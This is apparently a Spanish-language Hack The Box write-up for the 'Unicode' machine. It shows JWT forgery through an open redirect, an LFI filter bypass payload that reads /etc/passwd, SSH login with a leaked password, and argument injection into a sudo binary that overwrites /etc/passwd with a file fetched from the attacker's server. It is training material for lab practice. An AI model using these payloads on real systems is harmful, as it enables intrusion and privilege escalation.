---
layout: post
title: "Write Up Unicode. "
subtitle: "Starting-Point"
category: Blog
tags: [Medium,Chunin,Linux,HTB,JWT,JSOM,SUDO,OpenRedirect,Python,Web,Vulnerability-Assessment,Injection,Session-Handling,Cryptography,Reversing,Authentication,Password-Reuse,Cookie-Manipulation,Decompilation,LFI,Argument-Injection,Fuzzing-Web,eWPT,eWPTxv2,OSWE] 
image:
  path: /assets/img/unicode/unicode.png
---

***
<!--more-->

1. this ordered seed list will be replaced by the toc
{:toc}

***

## Reconnaissance


### nmap


```bash
nmap -p- --open --min-rate 5000 -n -vvv -Pn 10.10.11.126 -oA allports
```


![list](/assets/img/unicode/unicode-01.png){:.lead width="800" height="100" loading="lazy"}


***
### Services and Versions


```bash
nmap -p22,80 -sV -sC 10.10.11.126 -oN target
```
![list](/assets/img/unicode/Arch-2022-05-08-14-54-06.png){:.lead width="800" height="100" loading="lazy"}


***

## Vulnerability Analysis


### HTTP TCP-80


Uso de Investigacion web, Google Hacking,Google Dorks y recopilación de información gracias a servicios de terceros.e ispeccionamos la web, ademas de las tecnologias de la ip ataves de la terminal o via web esto lo hacemos con wapalizzer o whatweb.


![list](/assets/img/unicode/unicode-05.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
No encontramos nada interesante. 


Inspecionado la web vemos que nos redirigue a google y esta vulnerabilidad se llama `OpenRedirect`.


![list](/assets/img/unicode/unicode-008.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Pagina web.


En el login no podemos hacer nada pero podemos registrarnos y eso es lo que vamos hacer.


![list](/assets/img/unicode/unicode-12.png){:.lead width="800" height="100" loading="lazy"}


hay una pagina que nos lleva a `/uploads` donde podemos subir un archivo y eso es lo que vamos hacer.


![list](/assets/img/unicode/unicode-13.png){:.lead width="800" height="100" loading="lazy"}


Tambien como estamos loogeados podemos ver las cookies de secion y con las ayuda de [JWT.io] vamos a tratar de recomponer la cookie que estamos usando por la de root.


[JWT.io]:(https://jwt.io/)


![list](/assets/img/unicode/unicode-15.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Encontramos un dominio hackmedia.htb que lo vamos agregar al `/etc/hosts`.


Si husmeamos la web que esta en la cookie http://hackmedia.htb/static/jwks.json.

![list](/assets/img/unicode/unicode-17.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Encontramos un JWT que esta porpartes y que toca recomponer.


Con [mkjwk.org] vamos a construir el JWT de usuario administrador, lo primero es crear la claver privada y la clave publica 

[mkjwk.org]:(https://mkjwk.org/)

![list](/assets/img/unicode/unicode-18.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Generamos las claves.


![list](/assets/img/unicode/unicode-20.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Copiamos los outputs alos campos correspondientes en JWT.io.


Editamos en `Jwt.io` la ruta de donde va a tomar el archivo `jwks.json` el cual vamos a copiar el que esta en la maquina victima y vamos aeditar la parte `n:`.


![list](/assets/img/unicode/unicode-21.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Metemos el valor de n: que generamos en [mkjwk.org].


Ahora con todo eso nos montamos un servidor con python y editamos la ip la que esta apuntando y reeplazamos por `http://hackmedia.htb/static/../redirect?url=10.10.16.14/jwks.json` y le damos en generar y esto nos crea la cokie  del usuaro admin como ya lo crea lo reemplazamos en donde estamos loogeados y ya somo el usuario adminitrador.


![list](/assets/img/unicode/unicode-23.png){:.lead width="800" height="100" loading="lazy"}


Como vemos que en la url tiene un page lo que podemos pensar que es susecptible a `local file incusion` pero probando esta en en la lista negra algun os caracteres por lo que `/` vamos a convertirlos a `%ef%bc%8f%` para bypaser esa resticcion.


![list](/assets/img/unicode/unicode-24.png){:.lead width="800" height="100" loading="lazy"}


![list](/assets/img/unicode/unicode-25.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Lo bypaseamos con `%ef%bc%8f%..%ef%bc%8f%..%ef%bc%8f%..%ef%bc%8f%etc/passwd`.


![list](/assets/img/unicode/unicode-26.png){:.lead width="800" height="100" loading="lazy"}


Encontramos un usuarioc code y enumerando de la misma manera la maquina y las rutas encontramos un `db.yaml`


![list](/assets/img/unicode/unicode-27.png){:.lead width="800" height="100" loading="lazy"}


![list](/assets/img/unicode/unicode-28.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Encontramos unas contraseña `B3stC0d3r2021@@!`.


Como siempres se reutilizan contraseñas podemos tratar de conectarnos por SSH.


![list](/assets/img/unicode/unicode-29.png){:.lead width="800" height="100" loading="lazy"}


```shell
sshpass -p 'B3stC0d3r2021@@!' code@10.10.10.11.126
```


{:.note}
Ya podemos buscar la flag de bajos privileguios en el escritorip del usuario `code`. 


***

## Explotation


Siempre es bueno ejecutar `LimEnum` Y `pspy` para monitorizar y ver los posibles vectores para escalar de privilegios, ademas hasta que se ejecute los anteriores podemos buscar los permisos con el comado find o tareas crond o tareas que esperen ejecucion.


Si hacemos un `sudo -l` vemos que podemos ejecutar `treport` como root sin contraseña.


Nos tranferimos el binario a nuestra maquina para analizarlo con mas profundidad con `pyinstractor`.


![list](/assets/img/unicode/unicode-29.png){:.lead width="800" height="100" loading="lazy"}


```shell
python pyinstxtractor.py treport 
```

{:.note}
Nos extrae el repor que debe compilarse.


Ahora con pycdc  vamos a ejecutarlo y pasrle el report que no arrojo pero primero se debe compilar con `cdmake CMakelist.txt` dentro del repositorio que nos clonamos.


![list](/assets/img/unicode/unicode-35.png){:.lead width="800" height="100" loading="lazy"}


Ahora si por fin. ejecutamos.


![list](/assets/img/unicode/unicode-37.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Hay badchars de ahi que no podemosm usar bien treport.


![list](/assets/img/unicode/unicode-38.png){:.lead width="800" height="100" loading="lazy"}


```shell
{--config,/root/root}
```

{:.note}
Esto se hace en el campo de `Enter the IP/file_name:`.


Ahora si queremos loogearnos como root remplazamos el `/etc/shadow` por uno donde altermos la pass del usuario `root` y nos montamos un servido con python y hacemos lo siguiente:


![list](/assets/img/unicode/unicode-42.png){:.lead width="800" height="100" loading="lazy"}


```shell
{10.10.16.14/passwd,-o,/etc/passwd}
```


{:.note}
Remmplazamos passwd y lo ultimo es buscar la flag de superusuario en el escritorio de root.


***

```shell
🎉 Felicitaciones ya has comprometido Unicode de HackTheBox 🎉
```
{:.centered}
***


Back to [Certification eWPT](){:.heading.flip-title}
{:.read-more}

***
Back to [Certification eWPTv2](){:.heading.flip-title}
{:.read-more}

***
Back to [Certification OSWE](){:.heading.flip-title}
{:.read-more}

